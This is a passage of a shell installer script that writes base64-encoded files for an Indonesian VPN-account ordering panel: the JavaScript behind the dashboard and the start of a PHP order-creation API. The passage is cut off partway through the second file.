m90bz1idG4uZGF0YXNldC5wcm90bzsKfQpmdW5jdGlvbiBzZWxlY3RUcmlhbFByb3RvKGJ0bikgewogIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNtb2RhbFRyaWFsIC5wcm90by1idG5bZGF0YS1wcm90b10nKS5mb3JFYWNoKGI9PmIuY2xhc3NMaXN0LnJlbW92ZSgnYWN0aXZlJykpOwogIGJ0bi5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsgY3VycmVudFRyaWFsUHJvdG89YnRuLmRhdGFzZXQucHJvdG87Cn0KZnVuY3Rpb24gc2VsZWN0RHVyYXRpb24oYnRuKSB7CiAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLnByb3RvLWJ0bltkYXRhLWRheXNdJykuZm9yRWFjaChiPT5iLmNsYXNzTGlzdC5yZW1vdmUoJ2FjdGl2ZScpKTsKICBidG4uY2xhc3NMaXN0LmFkZCgnYWN0aXZlJyk7IGN1cnJlbnREYXlzPXBhcnNlSW50KGJ0bi5kYXRhc2V0LmRheXMpOyB1cGRhdGVIYXJnYSgpOwp9CmZ1bmN0aW9uIHVwZGF0ZUhhcmdhKCkgewogIGNvbnN0IHNlbD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3JkZXJTZXJ2ZXInKTsKICBpZighc2VsKSByZXR1cm47CiAgY29uc3Qgb3B0PXNlbC5vcHRpb25zW3NlbC5zZWxlY3RlZEluZGV4XTsKICBpZighb3B0KSByZXR1cm47CiAgY29uc3QgaFBkPXBhcnNlRmxvYXQob3B0LmRhdGFzZXQuaGFyZ2FIYXJpfHwwKSwgaFBtPXBhcnNlRmxvYXQob3B0LmRhdGFzZXQuaGFyZ2FCdWxhbnx8MCk7CiAgbGV0IGggPSBjdXJyZW50RGF5cyA+PSAzMCA/IChoUG0gKiBNYXRoLmZsb29yKGN1cnJlbnREYXlzLzMwKSkgKyAoaFBkICogKGN1cnJlbnREYXlzJTMwKSkgOiBoUGQgKiBjdXJyZW50RGF5czsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGFyZ2FWYWwnKS50ZXh0Q29udGVudD0nUnAgJytuZXcgSW50bC5OdW1iZXJGb3JtYXQoJ2lkLUlEJykuZm9ybWF0KGgpOwp9CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcmRlclNlcnZlcicpPy5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCB1cGRhdGVIYXJnYSk7CnVwZGF0ZUhhcmdhKCk7CgpmdW5jdGlvbiBzZWxlY3RNZXRob2QoYnRuKSB7CiAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLm1ldGhvZC1idG4nKS5mb3JFYWNoKGI9PmIuY2xhc3NMaXN0LnJlbW92ZSgnYWN0aXZlJykpOwogIGJ0bi5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsKICBjb25zdCBtPWJ0bi5kYXRhc2V0Lm1ldGhvZDsKICBbJ2JhbmtJbmZvJywnZGFuYUluZm8nLCdnb3BheUluZm8nLCdzaG9wZWVJbmZvJywncXJpc0luZm8nXS5mb3JFYWNoKGlkPT5kb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCkuc3R5bGUuZGlzcGxheT0nbm9uZScpOwogIGNvbnN0IG1hcD17bWFudWFsX3RyYW5zZmVyOidiYW5rSW5mbycsZGFuYTonZGFuYUluZm8nLGdvcGF5Oidnb3BheUluZm8nLHNob3BlcGF5OidzaG9wZWVJbmZvJyxxcmlzOidxcmlzSW5mbyd9OwogIGlmKG1hcFttXSkgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQobWFwW21dKS5zdHlsZS5kaXNwbGF5PScnOwp9CgpmdW5jdGlvbiBzaG93TW9kYWwoaWQpe2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKS5jbGFzc0xpc3QuYWRkKCdzaG93Jyl9CmZ1bmN0aW9uIGNsb3NlTW9kYWwoaWQpe2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKS5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyl9CmZ1bmN0aW9uIHNob3dUcmlhbE1vZGFsKCl7c2hvd01vZGFsKCdtb2RhbFRyaWFsJyk7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RyaWFsUmVzdWx0JykuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpfQoKZnVuY3Rpb24gZG9PcmRlcigpIHsKICBjb25zdCB1c2VybmFtZT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3JkZXJVc2VybmFtZScpLnZhbHVlLnRyaW0oKTsKICBjb25zdCBzZXJ2ZXJJZD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3JkZXJTZXJ2ZXInKS52YWx1ZTsKICBpZighdXNlcm5hbWUpe3Nob3dBbGVydCgncGFnZUFsZXJ0JywnVXNlcm5hbWUgd2FqaWIgZGlpc2khJywnZXJyb3InKTtyZXR1cm47fQogIGNvbnN0IGJ0bj1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3JkZXJCdG5UeHQnKTsKICBidG4uaW5uZXJIVE1MPSc8c3BhbiBjbGFzcz0ibG9hZGluZyI+PC9zcGFuPiBNZW1wcm9zZXMuLi4nOwogIGNvbnN0IGZkPW5ldyBGb3JtRGF0YSgpOwogIGZkLmFwcGVuZCgnc2VydmVyX2lkJyxzZXJ2ZXJJZCk7IGZkLmFwcGVuZCgndGlwZScsY3VycmVudFByb3RvKTsKICBmZC5hcHBlbmQoJ3VzZXJuYW1lJyx1c2VybmFtZSk7IGZkLmFwcGVuZCgnZGF5cycsY3VycmVudERheXMpOwogIGZldGNoKCcvb3JkZXJ2cG4vYXBpL2NyZWF0ZV9vcmRlci5waHAnLHttZXRob2Q6J1BPU1QnLGJvZHk6ZmR9KQogIC50aGVuKHI9PnIuanNvbigpKS50aGVuKHJlcz0+ewogICAgYnRuLmlubmVySFRNTD0nW0NBUlRdIE9yZGVyIFNla2FyYW5nJzsKICAgIGNvbnN0IGJveD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3JkZXJSZXN1bHQnKTsKICAgIGJveC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7CiAgICBpZihyZXMuc3VjY2Vzcyl7CiAgICAgIGJveC5pbm5lckhUTUw9YnVpbGRSZXN1bHRIVE1MKHJlcyk7CiAgICAgIHNob3dBbGVydCgncGFnZUFsZXJ0JywnW09LXSBBa3VuIGJlcmhhc2lsIGRpYnVhdCEnLCdzdWNjZXNzJyk7CiAgICAgIHNldFRpbWVvdXQoKCk9PntzaG93UGFnZSgnYWt1bicpO2xvY2F0aW9uLnJlbG9hZCgpO30sNDAwMCk7CiAgICB9IGVsc2UgewogICAgICBib3guaW5uZXJIVE1MPSc8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1lcnJvciI+W05PXSAnK2VzY0h0bWwocmVzLm1lc3NhZ2UpKyc8L2Rpdj4nOwogICAgfQogIH0pLmNhdGNoKCgpPT57YnRuLmlubmVySFRNTD0nW0NBUlRdIE9yZGVyIFNla2FyYW5nJzt9KTsKfQoKZnVuY3Rpb24gZG9UcmlhbCgpIHsKICBjb25zdCB1c2VybmFtZT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndHJpYWxVc2VybmFtZScpLnZhbHVlLnRyaW0oKTsKICBjb25zdCBzZXJ2ZXJJZD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndHJpYWxTZXJ2ZXInKS52YWx1ZTsKICBpZighdXNlcm5hbWUpe3JldHVybjt9CiAgY29uc3QgZmQ9bmV3IEZvcm1EYXRhKCk7CiAgZmQuYXBwZW5kKCdzZXJ2ZXJfaWQnLHNlcnZlcklkKTsgZmQuYXBwZW5kKCd0aXBlJyxjdXJyZW50VHJpYWxQcm90byk7CiAgZmQuYXBwZW5kKCd1c2VybmFtZScsdXNlcm5hbWUpOyBmZC5hcHBlbmQoJ2RheXMnLDEpOyBmZC5hcHBlbmQoJ2lzX3RyaWFsJywxKTsKICBmZXRjaCgnL29yZGVydnBuL2FwaS9jcmVhdGVfb3JkZXIucGhwJyx7bWV0aG9kOidQT1NUJyxib2R5OmZkfSkKICAudGhlbihyPT5yLmpzb24oKSkudGhlbihyZXM9PnsKICAgIGNvbnN0IGJveD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndHJpYWxSZXN1bHQnKTsKICAgIGJveC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7CiAgICBpZihyZXMuc3VjY2Vzcyl7Ym94LmlubmVySFRNTD1idWlsZFJlc3VsdEhUTUwocmVzKTt9CiAgICBlbHNle2JveC5pbm5lckhUTUw9JzxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LWVycm9yIj5bTk9dICcrZXNjSHRtbChyZXMubWVzc2FnZSkrJzwvZGl2Pic7fQogIH0pOwp9CgpmdW5jdGlvbiBidWlsZFJlc3VsdEhUTUwocmVzKSB7CiAgbGV0IGh0bWw9JzxkaXYgc3R5bGU9Im1hcmdpbi1ib3R0b206Ljc1cmVtIj48ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj5bT0tdIEFrdW4gYmVyaGFzaWwgZGlidWF0ITwvZGl2PjwvZGl2Pic7CiAgaHRtbCs9YDxkaXYgY2xhc3M9InJlc3VsdC1yb3ciPjxzcGFuIGNsYXNzPSJyZXN1bHQta2V5Ij5Vc2VybmFtZTwvc3Bhbj48c3BhbiBjbGFzcz0icmVzdWx0LXZhbCI+JHtlc2NIdG1sKHJlcy51c2VybmFtZXx8JycpfTwvc3Bhbj48L2Rpdj5gOwogIGlmKHJlcy51dWlkKSBodG1sKz1gPGRpdiBjbGFzcz0icmVzdWx0LXJvdyI+PHNwYW4gY2xhc3M9InJlc3VsdC1rZXkiPlVVSUQ8L3NwYW4+PHNwYW4gY2xhc3M9InJlc3VsdC12YWwiIHN0eWxlPSJmb250LWZhbWlseTptb25vc3BhY2U7Zm9udC1zaXplOi43cmVtIj4ke2VzY0h0bWwocmVzLnV1aWQpfTwvc3Bhbj48L2Rpdj5gOwogIGlmKHJlcy5wYXNzd29yZCkgaHRtbCs9YDxkaXYgY2xhc3M9InJlc3VsdC1yb3ciPjxzcGFuIGNsYXNzPSJyZXN1bHQta2V5Ij5QYXNzd29yZDwvc3Bhbj48c3BhbiBjbGFzcz0icmVzdWx0LXZhbCI+JHtlc2NIdG1sKHJlcy5wYXNzd29yZCl9PC9zcGFuPjwvZGl2PmA7CiAgaHRtbCs9YDxkaXYgY2xhc3M9InJlc3VsdC1yb3ciPjxzcGFuIGNsYXNzPSJyZXN1bHQta2V5Ij5FeHBpcmVkPC9zcGFuPjxzcGFuIGNsYXNzPSJyZXN1bHQtdmFsIj4ke2VzY0h0bWwocmVzLmV4cGlyZWR8fCcnKX08L3NwYW4+PC9kaXY+YDsKICBpZihyZXMubGlua190bHMpe2h0bWwrPSc8cCBzdHlsZT0iZm9udC1zaXplOi43NXJlbTtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luOi41cmVtIDAgLjI1cmVtIj5MaW5rIFRMUzo8L3A+PGRpdiBjbGFzcz0ibGluay1ib3giIG9uY2xpY2s9ImNvcHlUZXh0KFwnJytlc2NIdG1sKHJlcy5saW5rX3RscykrJ1wnLHRoaXMpIj4nK2VzY0h0bWwocmVzLmxpbmtfdGxzLnN1YnN0cmluZygwLDgwKSkrJy4uLjwvZGl2PjxwIGNsYXNzPSJjb3B5LWhpbnQiPlRhcCB1bnR1ayBzYWxpbjwvcD4nO30KICBpZihyZXMubGlua19ub250bHMpe2h0bWwrPSc8cCBzdHlsZT0iZm9udC1zaXplOi43NXJlbTtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luOi41cmVtIDAgLjI1cmVtIj5MaW5rIE5vblRMUzo8L3A+PGRpdiBjbGFzcz0ibGluay1ib3giIG9uY2xpY2s9ImNvcHlUZXh0KFwnJytlc2NIdG1sKHJlcy5saW5rX25vbnRscykrJ1wnLHRoaXMpIj4nK2VzY0h0bWwocmVzLmxpbmtfbm9udGxzLnN1YnN0cmluZygwLDgwKSkrJy4uLjwvZGl2Pic7fQogIGlmKHJlcy5saW5rX2dycGMpe2h0bWwrPSc8cCBzdHlsZT0iZm9udC1zaXplOi43NXJlbTtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luOi41cmVtIDAgLjI1cmVtIj5MaW5rIGdSUEM6PC9wPjxkaXYgY2xhc3M9ImxpbmstYm94IiBvbmNsaWNrPSJjb3B5VGV4dChcJycrZXNjSHRtbChyZXMubGlua19ncnBjKSsnXCcsdGhpcykiPicrZXNjSHRtbChyZXMubGlua19ncnBjLnN1YnN0cmluZygwLDgwKSkrJy4uLjwvZGl2Pic7fQogIGlmKHJlcy5kb3dubG9hZCl7aHRtbCs9YDxicj48YSBocmVmPSIke2VzY0h0bWwocmVzLmRvd25sb2FkKX0iIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lIGJ0bi1zbSI+4qyHIERvd25sb2FkIENvbmZpZzwvYT5gO30KICByZXR1cm4gaHRtbDsKfQoKZnVuY3Rpb24gc2hvd0FrdW5EZXRhaWwoYSkgewogIGxldCBodG1sPScnOwogIGh0bWwrPWA8ZGl2IGNsYXNzPSJyZXN1bHQtcm93Ij48c3BhbiBjbGFzcz0icmVzdWx0LWtleSI+VXNlcm5hbWU8L3NwYW4+PHNwYW4gY2xhc3M9InJlc3VsdC12YWwiPiR7ZXNjSHRtbChhLnVzZXJuYW1lKX08L3NwYW4+PC9kaXY+YDsKICBodG1sKz1gPGRpdiBjbGFzcz0icmVzdWx0LXJvdyI+PHNwYW4gY2xhc3M9InJlc3VsdC1rZXkiPlRpcGU8L3NwYW4+PHNwYW4gY2xhc3M9InJlc3VsdC12YWwiPiR7ZXNjSHRtbChhLnRpcGUpLnRvVXBwZXJDYXNlKCl9JHthLmlzX3RyaWFsPycgIFtHSUZUXSBUcmlhbCc6Jyd9PC9zcGFuPjwvZGl2PmA7CiAgaWYoYS51dWlkKSBodG1sKz1gPGRpdiBjbGFzcz0icmVzdWx0LXJvdyI+PHNwYW4gY2xhc3M9InJlc3VsdC1rZXkiPlVVSUQ8L3NwYW4+PHNwYW4gY2xhc3M9InJlc3VsdC12YWwiIHN0eWxlPSJmb250LWZhbWlseTptb25vc3BhY2U7Zm9udC1zaXplOi43cmVtIj4ke2VzY0h0bWwoYS51dWlkKX08L3NwYW4+PC9kaXY+YDsKICBpZihhLnBhc3N3b3JkX3ZwbikgaHRtbCs9YDxkaXYgY2xhc3M9InJlc3VsdC1yb3ciPjxzcGFuIGNsYXNzPSJyZXN1bHQta2V5Ij5QYXNzd29yZDwvc3Bhbj48c3BhbiBjbGFzcz0icmVzdWx0LXZhbCI+JHtlc2NIdG1sKGEucGFzc3dvcmRfdnBuKX08L3NwYW4+PC9kaXY+YDsKICBodG1sKz1gPGRpdiBjbGFzcz0icmVzdWx0LXJvdyI+PHNwYW4gY2xhc3M9InJlc3VsdC1rZXkiPlNlcnZlcjwvc3Bhbj48c3BhbiBjbGFzcz0icmVzdWx0LXZhbCI+JHtlc2NIdG1sKGEubmFtYV9zZXJ2ZXJ8fCcnKX08L3NwYW4+PC9kaXY+YDsKICBodG1sKz1gPGRpdiBjbGFzcz0icmVzdWx0LXJvdyI+PHNwYW4gY2xhc3M9InJlc3VsdC1rZXkiPkV4cGlyZWQ8L3NwYW4+PHNwYW4gY2xhc3M9InJlc3VsdC12YWwiPiR7ZXNjSHRtbChhLm1hc2FfYWt0aWZ8fCcnKX08L3NwYW4+PC9kaXY+YDsKICBpZihhLmxpbmtfdGxzKXtodG1sKz0nPHAgc3R5bGU9ImZvbnQtc2l6ZTouNzVyZW07Y29sb3I6dmFyKC0tbXV0ZWQpO21hcmdpbjouNzVyZW0gMCAuMjVyZW0iPkxpbmsgVExTOjwvcD48ZGl2IGNsYXNzPSJsaW5rLWJveCIgb25jbGljaz0iY29weVRleHQoXCcnK2VuY29kZVVSSUNvbXBvbmVudChhLmxpbmtfdGxzKSsnXCcsdGhpcykiPicrZXNjSHRtbChhLmxpbmtfdGxzLnN1YnN0cmluZygwLDgwKSkrJy4uLjwvZGl2PjxwIGNsYXNzPSJjb3B5LWhpbnQiPlRhcCB1bnR1ayBzYWxpbjwvcD4nO30KICBpZihhLmxpbmtfbm9udGxzKXtodG1sKz0nPHAgc3R5bGU9ImZvbnQtc2l6ZTouNzVyZW07Y29sb3I6dmFyKC0tbXV0ZWQpO21hcmdpbjouNXJlbSAwIC4yNXJlbSI+TGluayBOb25UTFM6PC9wPjxkaXYgY2xhc3M9ImxpbmstYm94IiBvbmNsaWNrPSJjb3B5VGV4dChcJycrZW5jb2RlVVJJQ29tcG9uZW50KGEubGlua19ub250bHMpKydcJyx0aGlzKSI+Jytlc2NIdG1sKGEubGlua19ub250bHMuc3Vic3RyaW5nKDAsODApKSsnLi4uPC9kaXY+Jzt9CiAgaWYoYS5saW5rX2dycGMpe2h0bWwrPSc8cCBzdHlsZT0iZm9udC1zaXplOi43NXJlbTtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luOi41cmVtIDAgLjI1cmVtIj5MaW5rIGdSUEM6PC9wPjxkaXYgY2xhc3M9ImxpbmstYm94IiBvbmNsaWNrPSJjb3B5VGV4dChcJycrZW5jb2RlVVJJQ29tcG9uZW50KGEubGlua19ncnBjKSsnXCcsdGhpcykiPicrZXNjSHRtbChhLmxpbmtfZ3JwYy5zdWJzdHJpbmcoMCw4MCkpKycuLi48L2Rpdj4nO30KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYWt1bkRldGFpbENvbnRlbnQnKS5pbm5lckhUTUw9aHRtbDsKICBzaG93TW9kYWwoJ21vZGFsQWt1bicpOwp9CgpmdW5jdGlvbiBjb25maXJtRGVsZXRlKGlkLG5hbWUsdHlwZSl7ZGVsZXRlQWt1bklkPWlkO2RlbGV0ZUFrdW5UeXBlPXR5cGU7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RlbGV0ZVVzZXJuYW1lJykudGV4dENvbnRlbnQ9bmFtZTtzaG93TW9kYWwoJ21vZGFsRGVsZXRlJyk7fQpmdW5jdGlvbiBkb0RlbGV0ZSgpewogIGlmKCFkZWxldGVBa3VuSWQpIHJldHVybjsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGVsZXRlQnRuJykuaW5uZXJIVE1MPSc8c3BhbiBjbGFzcz0ibG9hZGluZyI+PC9zcGFuPic7CiAgZmV0Y2goJy9vcmRlcnZwbi9hcGkvZGVsZXRlX2FjY291bnQucGhwJyx7bWV0aG9kOidQT1NUJyxoZWFkZXJzOnsnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJ30sYm9keTonYWt1bl9pZD0nK2RlbGV0ZUFrdW5JZH0pCiAgLnRoZW4ocj0+ci5qc29uKCkpLnRoZW4ocmVzPT57CiAgICBjbG9zZU1vZGFsKCdtb2RhbERlbGV0ZScpOwogICAgaWYocmVzLnN1Y2Nlc3Mpe3Nob3dBbGVydCgncGFnZUFsZXJ0JywnW09LXSBBa3VuIGJlcmhhc2lsIGRpaGFwdXMgZGFyaSBzZXJ2ZXIhJywnc3VjY2VzcycpO3NldFRpbWVvdXQoKCk9PmxvY2F0aW9uLnJlbG9hZCgpLDE1MDApO30KICAgIGVsc2V7c2hvd0FsZXJ0KCdwYWdlQWxlcnQnLCdbTk9dICcrZXNjSHRtbChyZXMubWVzc2FnZSksJ2Vycm9yJyk7fQogIH0pLmNhdGNoKCgpPT57Y2xvc2VNb2RhbCgnbW9kYWxEZWxldGUnKTt9KTsKfQoKZnVuY3Rpb24gZG9Ub3B1cCgpewogIGNvbnN0IGFtb3VudD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndG9wdXBBbW91bnQnKS52YWx1ZTsKICBjb25zdCBtZXRob2Q9ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLm1ldGhvZC1idG4uYWN0aXZlJyk/LmRhdGFzZXQubWV0aG9kfHwnbWFudWFsX3RyYW5zZmVyJzsKICBpZighYW1vdW50fHxhbW91bnQ8NTAwMCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RvcHVwUmVzdWx0JykuaW5uZXJIVE1MPSc8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1lcnJvciI+Tm9taW5hbCBtaW5pbWFsIFJwIDUuMDAwPC9kaXY+JztyZXR1cm47fQogIGNvbnN0IGZkPW5ldyBGb3JtRGF0YSgpOwogIGZkLmFwcGVuZCgnYW1vdW50JyxhbW91bnQpOyBmZC5hcHBlbmQoJ3BheW1lbnRfbWV0aG9kJyxtZXRob2QpOwogIGNvbnN0IGZpbGU9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2J1a3RpRmlsZScpLmZpbGVzWzBdOwogIGlmKGZpbGUpIGZkLmFwcGVuZCgnYnVrdGknLGZpbGUpOwogIGZldGNoKCcvb3JkZXJ2cG4vYXBpL3RvcHVwLnBocCcse21ldGhvZDonUE9TVCcsYm9keTpmZH0pCiAgLnRoZW4ocj0+ci5qc29uKCkpLnRoZW4ocmVzPT57CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndG9wdXBSZXN1bHQnKS5pbm5lckhUTUw9cmVzLnN1Y2Nlc3MKICAgICAgPyc8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj5bT0tdICcrZXNjSHRtbChyZXMubWVzc2FnZSkrJzwvZGl2PicKICAgICAgOic8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1lcnJvciI+W05PXSAnK2VzY0h0bWwocmVzLm1lc3NhZ2UpKyc8L2Rpdj4nOwogIH0pOwp9CgpmdW5jdGlvbiBzYXZlUHJvZmlsZSgpewogIGNvbnN0IGVtYWlsPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzZXR0aW5nRW1haWwnKS52YWx1ZTsKICBjb25zdCB3YT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2V0dGluZ1dhJykudmFsdWU7CiAgY29uc3QgcGFzcz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2V0dGluZ1Bhc3MnKS52YWx1ZTsKICBjb25zdCBwYXNzQz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2V0dGluZ1Bhc3NDb25maXJtJykudmFsdWU7CiAgaWYocGFzcyAmJiBwYXNzIT09cGFzc0Mpe3Nob3dBbGVydCgnc2V0dGluZ0FsZXJ0JywnUGFzc3dvcmQgdGlkYWsgY29jb2shJywnZXJyb3InKTtyZXR1cm47fQogIGNvbnN0IGZkPW5ldyBGb3JtRGF0YSgpOwogIGZkLmFwcGVuZCgnZW1haWwnLGVtYWlsKTsgZmQuYXBwZW5kKCd3aGF0c2FwcCcsd2EpOwogIGlmKHBhc3MpIGZkLmFwcGVuZCgncGFzc3dvcmQnLHBhc3MpOwogIGZldGNoKCcvb3JkZXJ2cG4vYXBpL3VwZGF0ZV9wcm9maWxlLnBocCcse21ldGhvZDonUE9TVCcsYm9keTpmZH0pCiAgLnRoZW4ocj0+ci5qc29uKCkpLnRoZW4ocmVzPT57CiAgICBzaG93QWxlcnQoJ3NldHRpbmdBbGVydCcscmVzLnN1Y2Nlc3M/J1tPS10gUHJvZmlsIGJlcmhhc2lsIGRpc2ltcGFuISc6J1tOT10gJytlc2NIdG1sKHJlcy5tZXNzYWdlKSxyZXMuc3VjY2Vzcz8nc3VjY2Vzcyc6J2Vycm9yJyk7CiAgfSk7Cn0KCmZ1bmN0aW9uIHNob3dBbGVydChjb250YWluZXJJZCxtc2csdHlwZSl7CiAgY29uc3QgZWw9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoY29udGFpbmVySWQpOwogIGlmKGVsKXtlbC5pbm5lckhUTUw9YDxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LSR7dHlwZX0iPiR7bXNnfTwvZGl2PmA7c2V0VGltZW91dCgoKT0+e2VsLmlubmVySFRNTD0nJ30sNTAwMCk7fQp9CmZ1bmN0aW9uIGNvcHlUZXh0KHRleHQsZWwpewogIGNvbnN0IGRlY29kZWQ9ZGVjb2RlVVJJQ29tcG9uZW50KHRleHQpOwogIG5hdmlnYXRvci5jbGlwYm9hcmQ/LndyaXRlVGV4dChkZWNvZGVkKS50aGVuKCgpPT57CiAgICBjb25zdCBvcmlnPWVsLmlubmVySFRNTDsgZWwuaW5uZXJIVE1MPSdbT0tdIFRlcnNhbGluISc7IHNldFRpbWVvdXQoKCk9PntlbC5pbm5lckhUTUw9b3JpZ30sMTUwMCk7CiAgfSkuY2F0Y2goKCk9Pnt9KTsKfQpmdW5jdGlvbiBlc2NIdG1sKHMpe3JldHVybiBTdHJpbmcoc3x8JycpLnJlcGxhY2UoLyYvZywnJmFtcDsnKS5yZXBsYWNlKC88L2csJyZsdDsnKS5yZXBsYWNlKC8+L2csJyZndDsnKS5yZXBsYWNlKC8iL2csJyZxdW90OycpO30KPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgo=" | base64 -d > "$DIR"/dashboard.php



    # api/create_order.php



    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy9jb25maWcucGhwJzsKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy92cG5fbWFuYWdlci5waHAnOwokc2Vzc2lvbiA9IHJlcXVpcmVMb2dpbigpOwpoZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicpOwoKJHVzZXJJZCAgID0gJHNlc3Npb25bJ3VzZXJfaWQnXTsKJHNlcnZlcklkID0gKGludCkoJF9QT1NUWydzZXJ2ZXJfaWQnXSA/PyAwKTsKJHRpcGUgICAgID0gc3RydG9sb3dlcihzYW5pdGl6ZSgkX1BPU1RbJ3RpcGUnXSA/PyAnJykpOwokdXNlcm5hbWUgPSBwcmVnX3JlcGxhY2UoJy9bXmEtekEtWjAtOV9cLV0vJywgJycsICRfUE9TVFsndXNlcm5hbWUnXSA/PyAnJyk7CiRkYXlzICAgICA9IChpbnQpKCRfUE9TVFsnZGF5cyddID8/IDApOwokaXNUcmlhbCAgPSBpc3NldCgkX1BPU1RbJ2lzX3RyaWFsJ10pICYmICRfUE9TVFsnaXNfdHJpYWwnXSA9PSAxOwoKaWYgKCEkc2VydmVySWQgfHwgISR0aXBlIHx8ICEkdXNlcm5hbWUgfHwgJGRheXMgPCAxKSB7CiAgICBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J1BhcmFtZXRlciB0aWRhayBsZW5na2FwJ10pOyBleGl0Owp9CmlmICghaW5fYXJyYXkoJHRpcGUsIFsnc3NoJywndm1lc3MnLCd2bGVzcycsJ3Ryb2phbiddKSkgewogICAgZWNobyBqc29uX2VuY29kZShbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidUaXBlIHRpZGFrIHZhbGlkJ10pOyBleGl0Owp9CgokZGIgPSBnZXREQigpOwoKLy8gQW1iaWwgc2VydmVyCiRzdCA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSBzZXJ2ZXJzIFdIRVJFIGlkPT8gQU5EIHN0YXR1cz0ncmVhZHknIik7CiRzdC0+ZXhlY3V0ZShbJHNlcnZlcklkXSk7ICRzZXJ2ZXIgPSAkc3QtPmZldGNoKCk7CmlmICghJHNlcnZlcikgeyBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J1NlcnZlciB0aWRhayB0ZXJzZWRpYSddKTsgZXhpdDsgfQoKLy8gSGl0dW5nIGhhcmdhCiRoYXJnYUhhcmkgID0gKGZsb2F0KSRzZXJ2ZXJbJ2hhcmdhX2hhcmknXTsKJGhhcmdhQnVsYW4gPSAoZmxvYXQpJHNlcnZlclsnaGFyZ2FfYnVsYW4nXTsKJGhhcmdhID0gJGRheXMgPj0gMzAKICAgID8gKCRoYXJnYUJ1bGFuICogZmxvb3IoJGRheXMvMzApKSArICgkaGFyZ2FIYXJpICogKCRkYXlzJTMwKSkKICAgIDogJGhhcmdhSGFyaSAqICRkYXlzOwoKLy8gVHJpYWwgY2hlY2sKaWYgKCRpc1RyaWFsKSB7CiAgICAkdXNlZCA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUIENPVU5UKCopIEZST00gdnBuX2FjY291bnRzIFdIRVJFIHVzZXJfaWQ9PyBBTkQgaXNfdHJpYWw9MSBBTkQgREFURShjcmVhdGVkX2F0KT1DVVJEQVRFKCkiKTsKICAgICR1c2VkLT5leGVjdXRlKFskdXNlcklkXSk7CiAgICBpZiAoKGludCkkdXNlZC0+ZmV0Y2hDb2x1bW4oKSA+IDApIHsKICAgICAgICBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J0thbXUgc3VkYWggYW1iaWwgdHJpYWwgaGFyaSBpbmkuIENvYmEgbGFnaSBiZXNvay4nXSk7IGV4aXQ7CiAgICB9CiAgICAkaGFyZ2EgPSAwOyAkZGF5cyA9IDE7ICRpc1RyaWFsID0gdHJ1ZTsKfSBlbHNlIHsKICAgIC8vIENlayBzYWxkbwogICAgJHUgPSAkZGItPnByZXBhcmUoIlNFTEVDVCBzYWxkbyBGUk9NIHVz